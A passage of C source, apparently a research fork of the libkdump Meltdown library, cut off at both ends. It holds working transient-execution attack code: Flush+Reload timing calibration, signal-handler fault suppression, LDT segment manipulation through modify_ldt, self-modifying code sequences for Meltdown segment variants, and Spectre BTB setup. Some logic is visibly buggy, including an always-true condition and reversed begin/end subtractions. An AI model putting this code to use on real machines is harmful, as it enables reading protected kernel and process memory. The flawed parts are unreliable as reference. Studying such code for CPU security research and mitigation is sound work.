	maccess(ptr);
	for (i = 0; i < count; i++) {
		start = rdtsc();
		maccess(ptr);
		end = rdtsc();
		reload_time += (end - start);
	}
	for (i = 0; i < count; i++) {
		start = rdtsc();
		maccess(ptr);
		end = rdtsc();
		flush(ptr);
		flush_reload_time += (end - start);
	}
	reload_time /= count;
	flush_reload_time /= count;

	debug(INFO, "Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
		flush_reload_time, reload_time);
	config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
	debug(SUCCESS, "Flush+Reload threshold: %zd cycles\n",
		config.cache_miss_threshold);
}

// ---------------------------------------------------------------------------
static void auto_config() {
	debug(INFO, "Auto configuration\n");
	detect_fault_handling();
	detect_flush_reload_threshold();
	config.measurements = 3;
	config.accept_after = 1;
	config.load_threads = 1;
	config.load_type = NOP;
	config.retries = 10000;
	config.physical_offset = DEFAULT_PHYSICAL_OFFSET;
}

// ---------------------------------------------------------------------------
static int check_config() {
	if (config.cache_miss_threshold <= 0) {
		detect_flush_reload_threshold();
	}
	if (config.cache_miss_threshold <= 0) {
		errno = ETIME;
		return -1;
	}
	return 0;
}

// ---------------------------------------------------------------------------
static void unblock_signal(int signum __attribute__((__unused__))) {
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

// ---------------------------------------------------------------------------
static void segfault_handler(int signum) {
	(void)signum;
	unblock_signal(SIGSEGV);
	longjmp(buf, 1);
}

// ---------------------------------------------------------------------------
static void busfault_handler(int signum) {
	(void)signum;
	unblock_signal(SIGBUS);
	longjmp(buf, 1);
}

// ---------------------------------------------------------------------------
libkdump_config_t libkdump_get_autoconfig() {
	auto_config();
	return config;
}

// ---------------------------------------------------------------------------
int libkdump_init(const libkdump_config_t configuration) {
	int j;
	config = configuration;
	if (memcmp(&config, &libkdump_auto_config, sizeof(libkdump_config_t)) == 0) {
		auto_config();
	}

	int err = check_config();
	if (err != 0) {
		errno = err;
		return -1;
	}
	_mem = malloc(4096 * 300);
	if (!_mem) {
		errno = ENOMEM;
		return -1;
	}

	for (j = 0; j < 128; j++) {
		size_t *current = (size_t *)_mem + j;
		*current = (size_t)(current + 1);
	}

	mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
	memset(mem, 0xab, 4096 * 290);

	// should set last cache line as "phys"
	for (j = 0; j < 64; j++) {
		size_t *temp = (size_t *)(mem + 64 * j);
		*temp = (size_t)(mem + 64 * (j+1));
	}

	for (j = 0; j < 256; j++) {
		flush(mem + j * 4096);
	}

	_evict = malloc(4096 * 40);
	if (!_evict) {
		errno = ENOMEM;
		return -1;
	}
	evict = (char *)(((size_t)_evict & ~0xfff) + 0x1000);
	memset(evict, 0xab, 4096 * 32);

	stack_backup = (char *)malloc(4096 * 3);
	if (!stack_backup) {
		errno = ENOMEM;
		return -1;
	}

	load_thread = malloc(sizeof(pthread_t) * config.load_threads);
	void *thread_func;
	switch (config.load_type) {
		case IO:
		thread_func = syncthread;
		break;
		case YIELD:
		thread_func = yieldthread;
		break;
		case NOP:
		default:
		thread_func = nopthread;
	}

	for (j = 0; j < config.load_threads; j++) {
		int r = pthread_create(&load_thread[j], 0, thread_func, 0);
		if (r != 0) {
			int k;
			for (k = 0; k < j; k++) {
				pthread_cancel(load_thread[k]);
			}
			free(load_thread);
			free(_mem);
			errno = r;
			return -1;
		}
	}
	debug(SUCCESS, "Started %d load threads\n", config.load_threads);

	if (config.fault_handling == SIGNAL_HANDLER) {
		if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
			debug(ERROR, "Failed to setup signal handler\n");
			libkdump_cleanup();
			return -1;
		}
		if (signal(SIGBUS, busfault_handler) == SIG_ERR) {
			debug(ERROR, "Failed to setup signal handler (2)\n");
			libkdump_cleanup();
			return -1;
		}
		debug(SUCCESS, "Successfully setup signal handler\n");
	}

	setexec = open("/proc/setexec", O_WRONLY);
	assert(setexec >= 0);
	return 0;
}

// ---------------------------------------------------------------------------
int libkdump_cleanup() {
	int j;
	if (config.fault_handling == SIGNAL_HANDLER) {
		signal(SIGSEGV, SIG_DFL);
	}

	for (j = 0; j < config.load_threads; j++) {
		pthread_cancel(load_thread[j]);
	}
	free(load_thread);
	free(_mem);
	debug(SUCCESS, "Everything is cleaned up, good bye!\n");
	return 0;
}

// ---------------------------------------------------------------------------
size_t libkdump_phys_to_virt(size_t addr) {
	/* we are given full address (kernel or physical) here */
	if (addr + config.physical_offset < config.physical_offset)
		return addr;

#ifdef __x86_64__
	/* address given is bigger than identity mapping 64TB  */
	if (addr >= (64ULL * 1024ULL * 1024ULL * 1024ULL * 1024ULL)) {
		debug(ERROR, "phys_to_virt argument is > 64 TB\n");
		return -1ULL;
	}
#endif

	return addr + config.physical_offset;
}

// ---------------------------------------------------------------------------
void libkdump_enable_debug(int enable) { dbg = enable; }

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) dump_stack() {
	char *stack_addr;
	asm volatile("movl %%ebp, %0" : "=r"(stack_addr));
	memcpy(stack_backup, stack_addr-0x100, 0x200);
}

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) restore_stack() {
	char *stack_addr;
	asm volatile("movl %%ebp, %0" : "=r"(stack_addr));
	memcpy(stack_addr-0x100, stack_backup, 0x200);
}

// ---------------------------------------------------------------------------
void __attribute__((optimize("-Os"))) libkdump_xmm_prepare(size_t addr, int is_legal) {
	uint64_t *from = (uint64_t *)legal;
	*from = 0x0;
	uint64_t *to = (uint64_t *)(legal + 1);
	*to = 0x42000;
	legal++;

	if (is_legal)
		phys = legal;
	else
		phys = addr+1;
}

// ---------------------------------------------------------------------------
void __attribute__((optimize("-Os"))) libkdump_bound_prepare() {
	asm volatile("add $0x3c0, %%ebx\n"
		"movl $0x0, (%%ebx)\n"
		"movl $0x10, 4(%%ebx)\n"
		"clflush (%%ebx)\n"
		:
		: "b"(mem)
		:);
}

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) libkdump_segment_prepare() {
	int num_bytes;

	 // assert((size_t)phys > (size_t)mem);

	table_entry_ptr = (struct user_desc *)malloc(sizeof(struct user_desc));

	table_entry_ptr->entry_number = 0x0;
	table_entry_ptr->base_addr = 0x0;
	 // limit should be set to greater than mem but smaller than phys
	table_entry_ptr->limit = 0xf;
	table_entry_ptr->seg_32bit = 0x1;
	table_entry_ptr->contents = 0x0;
	table_entry_ptr->read_exec_only = 0x0;
	table_entry_ptr->limit_in_pages = 0x0;
	table_entry_ptr->seg_not_present = 0x0;
	table_entry_ptr->useable = 0x1;

	num_bytes = syscall(__NR_modify_ldt, LDT_WRITE, table_entry_ptr, sizeof(struct user_desc));
}

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) libkdump_segment_ro_prepare() {
	int num_bytes;

	 // assert((size_t)phys > (size_t)mem);

	table_entry_ptr = (struct user_desc *)malloc(sizeof(struct user_desc));

	table_entry_ptr->entry_number = 0x0;
	table_entry_ptr->base_addr = 0x0;
	 // limit should be set to greater than mem but smaller than phys
	table_entry_ptr->limit = 0xfffff;
	table_entry_ptr->seg_32bit = 0x1; // big
	table_entry_ptr->contents = 0x0;
	table_entry_ptr->read_exec_only = 0x1;
	table_entry_ptr->limit_in_pages = 0x1; // g
	table_entry_ptr->seg_not_present = 0x0; // p
	table_entry_ptr->useable = 0x1; // sys

	num_bytes = syscall(__NR_modify_ldt, LDT_WRITE, table_entry_ptr, sizeof(struct user_desc));
	assert(num_bytes == 0);

	// if about to set ro, store another data value first
	asm volatile("movl $0x23000, (%%ecx)\n"
		"mfence\n" : : "c"(phys));
}

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) libkdump_segment_xo_prepare() {
	int num_bytes;

	// assert((size_t)phys > (size_t)mem);

	table_entry_ptr = (struct user_desc *)malloc(sizeof(struct user_desc));

	table_entry_ptr->entry_number = 0x0;
	table_entry_ptr->base_addr = 0x0;
	// limit should be set to greater than mem but smaller than phys
	table_entry_ptr->limit = 0xfffff;
	table_entry_ptr->seg_32bit = 0x1;
	table_entry_ptr->contents = 0x2; // non-conforming code
	table_entry_ptr->read_exec_only = 0x1;
	table_entry_ptr->limit_in_pages = 0x1;
	table_entry_ptr->seg_not_present = 0x0;
	table_entry_ptr->useable = 0x1;

	num_bytes = syscall(__NR_modify_ldt, LDT_WRITE, table_entry_ptr, sizeof(struct user_desc));
}

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) libkdump_segment_np_prepare() {
	int num_bytes;

	// assert((size_t)phys > (size_t)mem);

	table_entry_ptr = (struct user_desc *)malloc(sizeof(struct user_desc));

	table_entry_ptr->entry_number = 0x0;
	table_entry_ptr->base_addr = 0x0;
	// limit should be set to greater than mem but smaller than phys
	table_entry_ptr->limit = 0xfffff;
	table_entry_ptr->seg_32bit = 0x1;
	table_entry_ptr->contents = 0x0;
	table_entry_ptr->read_exec_only = 0x0;
	table_entry_ptr->limit_in_pages = 0x1;
	table_entry_ptr->seg_not_present = 0x1;
	table_entry_ptr->useable = 0x1;

	num_bytes = syscall(__NR_modify_ldt, LDT_WRITE, table_entry_ptr, sizeof(struct user_desc));
}

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) libkdump_segment_system_prepare() {
	int num_bytes;

	// assert((size_t)phys > (size_t)mem);

	table_entry_ptr = (struct user_desc *)malloc(sizeof(struct user_desc));

	table_entry_ptr->entry_number = 0x0;
	table_entry_ptr->base_addr = 0x0;
	// limit should be set to greater than mem but smaller than phys
	table_entry_ptr->limit = 0xfffff;
	table_entry_ptr->seg_32bit = 0x1; // big
	table_entry_ptr->contents = 0x0;
	table_entry_ptr->read_exec_only = 0x0;
	table_entry_ptr->limit_in_pages = 0x1; // g
	table_entry_ptr->seg_not_present = 0x0; // p
	table_entry_ptr->useable = 0x0; // sys

	num_bytes = syscall(__NR_modify_ldt, LDT_WRITE, table_entry_ptr, sizeof(struct user_desc));
	assert(num_bytes == 0);
}

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) libkdump_segment_ds_restore() {
	asm volatile("pushl %eax\n"
		"movl $0x2b, %eax\n"
		"movl %eax, %ds\n"
		"popl %eax\n");
}

// ---------------------------------------------------------------------------
static void __attribute__((always_inline)) libkdump_segment_ss_restore() {
	asm volatile("sub $0x4, %esp\n"
		"movl %eax, %ds:(%esp)\n"
		"movl $0x2b, %eax\n"
		"movl %eax, %ss\n"
		"movl %ds:(%esp), %eax\n"
		"add $0x4, %esp\n");
}

// ---------------------------------------------------------------------------
size_t libkdump_get_data() {
	return (size_t)_mem;
}

// ---------------------------------------------------------------------------
void libkdump_prefetch_read_prepare(size_t addr) {
	// set last cache line as "phys"
	size_t *temp = (size_t *)(mem + 4096 + 64 * 63);
	*temp = phys;

	/// set slow-beginning load address
	temp = (size_t *)(mem - 64);
	*temp = (size_t)mem;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_prefetch_read_signal_handler(size_t legal_addr, 
	int cache_level, int tlb_present, int expected_data, size_t *code_seq_addr) {
	if (code_seq_addr != NULL) {
		extern const char CODE_SEQUENCE[];
		*code_seq_addr = (size_t)CODE_SEQUENCE;
		return -1;
	}

	size_t retries = config.retries + 1;
	uint64_t start = 0, end = 0;
	int count[3] = {0, 0, 0};

	// replace phys and mem with local variables to make sure them in cache (to avoid DS segment)
	size_t phys_local = phys;
	char *mem_local = mem;
	int i;

	while (retries--) {
		libkdump_prepare_data_condition(legal_addr, cache_level, tlb_present);

		flush(mem - 64);

		if (!setjmp(buf)) {
			if (to_modify_ldt == 1)
				libkdump_segment_prepare();
			else if (to_modify_ldt == 2)
				libkdump_segment_ro_prepare();
			else if (to_modify_ldt == 3)
				libkdump_segment_xo_prepare();
			else if (to_modify_ldt == 6)
				libkdump_segment_np_prepare();

			if (to_backup_stack)
				dump_stack();

			
			asm volatile(
				"CODE_SEQUENCE:\n"
				"sub %%ebx, %%ecx\n"
				"sub $64, %%ebx\n" 
				"movl (%%ebx), %%edi\n"          
				"movl (%%edi, %%ecx, 1), %%ecx\n"
				"movl (%%edi, %%ecx, 1), %%ecx\n" 
				"add $1, %%ecx\n"  
				"sub $1, %%ecx\n"  
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				"add $1, %%ecx\n"                
				"sub $1, %%ecx\n"                
				:                                 
				: "c"(phys), "b"(mem)             
				: "eax", "edx", "edi", "esi");
			printf("no error\n");
		}

		if (to_modify_ldt) {
			libkdump_segment_ss_restore();
			libkdump_segment_ds_restore();
		}

		if (to_backup_stack)
			restore_stack();

		i = expected_data;
		if (flush_reload(mem + i * 4096)) { // B
			count[0]++;
		}
		i = 0;
		if (flush_reload(mem + i * 4096)) { // 0
			count[1]++;
		}
	}

	printf("0x%x - %d; 0x0 - %d\n", expected_data, count[0], count[1]);

	if (count[0] == 0 && count[1] == 0)
		return -1;
	else
		return (count[0] >= count[1]) ? expected_data : 0x0;
}

// ---------------------------------------------------------------------------
void libkdump_select_code_sequence(int type, void *code_seq_addr) {
	size_t base_addr, code_len;
	switch (type) {
		case MELTDOWN_STANDARD:
		base_addr = (size_t)meltdown_depth_begin;
		code_len = (size_t)meltdown_depth_end - (size_t)meltdown_depth_begin;
		break;
		case MELTDOWN_BOUND:
		base_addr = (size_t)meltdown_bound_begin;
		code_len = (size_t)meltdown_bound_end - (size_t)meltdown_bound_begin;
		break;
		case MELTDOWN_SEGMENT_DS:
		case MELTDOWN_SEGMENT_DS_NP:
		case MELTDOWN_SEGMENT_CS_XO:
		base_addr = (size_t)meltdown_segment_ds_begin;
		code_len = (size_t)meltdown_segment_ds_end - (size_t)meltdown_segment_ds_begin;
		break;
		case MELTDOWN_SEGMENT_DS_NULL:
		base_addr = (size_t)meltdown_segment_ds_null_begin;
		code_len = (size_t)meltdown_segment_ds_null_end - (size_t)meltdown_segment_ds_null_begin;
		break;
		case MELTDOWN_SEGMENT_SS:
		base_addr = (size_t)meltdown_segment_ss_begin;
		code_len = (size_t)meltdown_segment_ss_end - (size_t)meltdown_segment_ss_begin;
		break;
		case MELTDOWN_SEGMENT_SS_RO:
		case MELTDOWN_SEGMENT_SS_NP:
		base_addr = (size_t)meltdown_segment_ss_np_begin;
		code_len = (size_t)meltdown_segment_ss_np_end - (size_t)meltdown_segment_ss_np_begin;
		break;
		case MELTDOWN_SEGMENT_SS_NULL:
		base_addr = (size_t)meltdown_segment_ss_null_begin;
		code_len = (size_t)meltdown_segment_ss_null_end - (size_t)meltdown_segment_ss_null_begin;
		break;
		case MELTDOWN_SEGMENT_DS_PRIVILEGE:
		base_addr = (size_t)meltdown_segment_ds_privilege_begin;
		code_len = (size_t)meltdown_segment_ds_privilege_end - (size_t)meltdown_segment_ds_privilege_begin;
		break;
		case MELTDOWN_SEGMENT_SS_PRIVILEGE:
		base_addr = (size_t)meltdown_segment_ss_privilege_begin;
		code_len = (size_t)meltdown_segment_ss_privilege_end - (size_t)meltdown_segment_ss_privilege_begin;
		break;
		case MELTDOWN_SEGMENT_DS_RO:
		base_addr = (size_t)meltdown_segment_ds_write_begin;
		code_len = (size_t)meltdown_segment_ds_write_end - (size_t)meltdown_segment_ds_write_begin;
		break;
		default:
		break;
	}

	if (code_len != 0)
		memcpy(code_seq_addr, (void *)base_addr, code_len);
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-O0"))) libkdump_window_measure(size_t addr, size_t legal_addr,
	int code_type, int cache_level, int tlb_flush, int expected_data) {
	phys = addr;
	legal = legal_addr;

	// if provided a legal address, library could set the data;
	// otherwise the application should set it instead.
	if (legal_addr != 0)
		*(uint64_t *)legal_addr = expected_data << 12;

	size_t code_seq_addr = 0;
	libkdump_prefetch_read_signal_handler(0, 0, 0, 0, &code_seq_addr);
	printf("code_seq_addr: 0x%lx\n", (unsigned long)code_seq_addr);
	assert(mprotect((void *)((code_seq_addr >> 12) << 12), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
	libkdump_select_code_sequence(code_type, (void *)code_seq_addr);

	if (code_type == MELTDOWN_XMM)
		libkdump_xmm_prepare(addr, 0);
	else if (code_type == MELTDOWN_BOUND)
		libkdump_bound_prepare();
	else if (code_type == MELTDOWN_SEGMENT_DS || code_type == MELTDOWN_SEGMENT_SS)
	// wait until running test code to avoid exceptions during preparation
	// libkdump_segment_prepare();
		to_modify_ldt = 1;
	else if (code_type == MELTDOWN_SEGMENT_DS_RO || MELTDOWN_SEGMENT_SS_RO)
		to_modify_ldt = 2;
	else if (code_type == MELTDOWN_SEGMENT_CS_XO)
		to_modify_ldt = 3;
	else if (code_type == MELTDOWN_SEGMENT_DS_NULL || code_type == MELTDOWN_SEGMENT_SS_NULL)
		to_modify_ldt = 4;
	else if (code_type == MELTDOWN_SEGMENT_DS_PRIVILEGE || code_type == MELTDOWN_SEGMENT_SS_PRIVILEGE)
		to_modify_ldt = 5;
	else if (code_type == MELTDOWN_SEGMENT_DS_NP || code_type == MELTDOWN_SEGMENT_SS_NP)
		to_modify_ldt = 6;
	else
		libkdump_prefetch_read_prepare(addr);

	if (to_modify_ldt && (code_type % 2 == 0))
		to_backup_stack = 1;

	// char res_stat[256];
	int i, j, r, error_score = 0;
	int window_size[MAX_MEASUREMENT], window_size_score[MAX_WINDOW_SIZE];
	for (i = 0; i < MAX_MEASUREMENT; i++)
		window_size[i] = 1000;
	for (i = 0; i < MAX_WINDOW_SIZE; i++)
		window_size_score[i] = 0;

	// sched_yield();
	printf("preparation done\n");

	for (i = 0; i < config.measurements && i < MAX_MEASUREMENT; i++) {
		if (config.fault_handling == TSX) {
			// r = libkdump_read_tsx();
			printf("Please use sig handler instead of TSX.\n");
			return -1;
		} else {
			r = libkdump_prefetch_read_signal_handler(legal_addr, cache_level, tlb_flush, expected_data, NULL);
		}

		if (r >= 0) {
			window_size[i] = r;
			window_size_score[r]++;
			// break;
		}
		else {
			printf("[!] Unable to capture anything with covert channel!\n");
			window_size[i] = -1;
			error_score++;
			// break;
		}
	}

	if (1) {
		to_modify_ldt = 0;
		to_backup_stack = 0;
	}

	int max_v = 0, max_i = 0;

	for (i = 0; i < MAX_WINDOW_SIZE; i++) {
		if (window_size_score[i] == 0)
			continue;
		if (dbg)
			debug(INFO, "window_size_score[%d] = 0x%d\n",
				i, window_size_score[i]);
		if (window_size_score[i] > max_v) {
			max_v = window_size_score[i];
			max_i = i;
		}
	}
	return max_i;
}

// ---------------------------------------------------------------------------
// spectre btb

#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif /* ifdef _MSC_VER */
#include <immintrin.h>

extern const char branch_meltdown_standard_begin[], branch_meltdown_standard_end[];
extern const char branch_meltdown_segment_ds_begin[], branch_meltdown_segment_ds_end[];
extern const char branch_meltdown_segment_ss_begin[], branch_meltdown_segment_ss_end[];
extern const char branch_meltdown_segment_ss_np_begin[], branch_meltdown_segment_ss_np_end[];
extern const char branch_meltdown_segment_cs_begin[], branch_meltdown_segment_cs_end[];
extern const char branch_meltdown_segment_ds_null_begin[], branch_meltdown_segment_ds_null_end[];
extern const char branch_meltdown_segment_ss_null_begin[], branch_meltdown_segment_ss_null_end[];
extern const char branch_meltdown_segment_ds_privilege_begin[], branch_meltdown_segment_ds_privilege_end[];
extern const char branch_meltdown_segment_ss_privilege_begin[], branch_meltdown_segment_ss_privilege_end[];
extern const char branch_meltdown_segment_ds_write_begin[], branch_meltdown_segment_ds_write_end[];

#define ADD_INST_LEN 3
#define SUB_INST_LEN 3
#define COVERT_CHANNEL_INST_LEN 4
#define COVERT_CHANNEL_2_INST_LEN 7 // this is used when faulty instruction is a write

size_t *xp = NULL;
size_t *xp1 = NULL;
size_t *xp2 = NULL;
size_t *xp3 = NULL;
size_t *xp4 = NULL;

// ---------------------------------------------------------------------------
void libkdump_insert_speculative_instruction(int code_type, int number, void *code_seq_addr) {
	size_t base_addr = (size_t)code_seq_addr, from_addr;
	size_t step_size, to_addr;

	switch (code_type) {
		case MELTDOWN_SEGMENT_STANDARD:
		to_addr = base_addr + ((size_t)branch_meltdown_standard_end - (size_t)branch_meltdown_standard_begin);
		break;
		case MELTDOWN_SEGMENT_DS:
		case MELTDOWN_SEGMENT_DS_NP:
		case MELTDOWN_SEGMENT_CS_XO:
		to_addr = base_addr + ((size_t)branch_meltdown_segment_ds_end - (size_t)branch_meltdown_segment_ds_begin);
		break;
		case MELTDOWN_SEGMENT_DS_NULL:
		to_addr = base_addr + ((size_t)branch_meltdown_segment_ds_null_end - (size_t)branch_meltdown_segment_ds_null_begin);
		break;
		case MELTDOWN_SEGMENT_SS:
		to_addr = base_addr + ((size_t)branch_meltdown_segment_ss_end - (size_t)branch_meltdown_segment_ss_begin);
		break;
		case MELTDOWN_SEGMENT_SS_RO:
		case MELTDOWN_SEGMENT_SS_NP:
		to_addr = base_addr + ((size_t)branch_meltdown_segment_ss_np_end - (size_t)branch_meltdown_segment_ss_np_begin);
		break;
		case MELTDOWN_SEGMENT_SS_NULL:
		to_addr = base_addr + ((size_t)branch_meltdown_segment_ss_null_end - (size_t)branch_meltdown_segment_ss_null_begin);
		break;
		case MELTDOWN_SEGMENT_DS_PRIVILEGE:
		to_addr = base_addr + ((size_t)branch_meltdown_segment_ds_privilege_begin - (size_t)branch_meltdown_segment_ds_privilege_end);
		break;
		case MELTDOWN_SEGMENT_SS_PRIVILEGE:
		to_addr = base_addr + ((size_t)branch_meltdown_segment_ss_privilege_begin - (size_t)branch_meltdown_segment_ss_privilege_end);
		break;
		case MELTDOWN_SEGMENT_DS_RO:
		to_addr = base_addr + ((size_t)branch_meltdown_segment_ds_write_begin - (size_t)branch_meltdown_segment_ds_write_end);
		break;
		default:
		break;
	}

	if ((number % 2) == 1) {
		step_size = ADD_INST_LEN;
		from_addr = (size_t)branch_meltdown_standard_end;
	}
	else {
		step_size = SUB_INST_LEN;
		from_addr = (size_t)branch_meltdown_standard_end + ADD_INST_LEN;
	}

	to_addr += (number+1)/2 * ADD_INST_LEN + number/2 * SUB_INST_LEN - COVERT_CHANNEL_INST_LEN;
	base_addr = to_addr - step_size;

	// asm volatile("cpuid":::"eax", "ebx", "ecx", "edx");

	// copy covert channel access inst to one ADD/SUB later
	memcpy((void *)to_addr, (void *)base_addr, COVERT_CHANNEL_INST_LEN);
	// copy ADD/SUB to to_addr
	memcpy((void *)base_addr, (void *)from_addr, step_size);
}

// ---------------------------------------------------------------------------
void libkdump_select_branch_code_sequence(int type, void *code_seq_addr) {
	size_t base_addr, code_len;
	switch (type) {
		case MELTDOWN_SEGMENT_STANDARD:
		base_addr = (size_t)branch_meltdown_standard_begin;
		code_len = (size_t)branch_meltdown_standard_end - (size_t)branch_meltdown_standard_begin;
		break;
		case MELTDOWN_SEGMENT_DS:
		case MELTDOWN_SEGMENT_DS_NP:
		case MELTDOWN_SEGMENT_CS_XO:
		base_addr = (size_t)branch_meltdown_segment_ds_begin;
		code_len = (size_t)branch_meltdown_segment_ds_end - (size_t)branch_meltdown_segment_ds_begin;
		break;
		case MELTDOWN_SEGMENT_DS_NULL:
		base_addr = (size_t)branch_meltdown_segment_ds_null_begin;
		code_len = (size_t)branch_meltdown_segment_ds_null_end - (size_t)branch_meltdown_segment_ds_null_begin;
		break;
		case MELTDOWN_SEGMENT_SS:
		base_addr = (size_t)branch_meltdown_segment_ss_begin;
		code_len = (size_t)branch_meltdown_segment_ss_end - (size_t)branch_meltdown_segment_ss_begin;
		break;
		case MELTDOWN_SEGMENT_SS_RO:
		case MELTDOWN_SEGMENT_SS_NP:
		base_addr = (size_t)branch_meltdown_segment_ss_np_begin;
		code_len = (size_t)branch_meltdown_segment_ss_np_end - (size_t)branch_meltdown_segment_ss_np_begin;
		break;
		case MELTDOWN_SEGMENT_SS_NULL:
		base_addr = (size_t)branch_meltdown_segment_ss_null_begin;
		code_len = (size_t)branch_meltdown_segment_ss_null_end - (size_t)branch_meltdown_segment_ss_null_begin;
		break;
		case MELTDOWN_SEGMENT_DS_PRIVILEGE:
		base_addr = (size_t)branch_meltdown_segment_ds_privilege_begin;
		code_len = (size_t)branch_meltdown_segment_ds_privilege_end - (size_t)branch_meltdown_segment_ds_privilege_begin;
		break;
		case MELTDOWN_SEGMENT_SS_PRIVILEGE:
		base_addr = (size_t)branch_meltdown_segment_ss_privilege_begin;
		code_len = (size_t)branch_meltdown_segment_ss_privilege_end - (size_t)branch_meltdown_segment_ss_privilege_begin;
		break;
		case MELTDOWN_SEGMENT_DS_RO:
		base_addr = (size_t)branch_meltdown_segment_ds_write_begin;
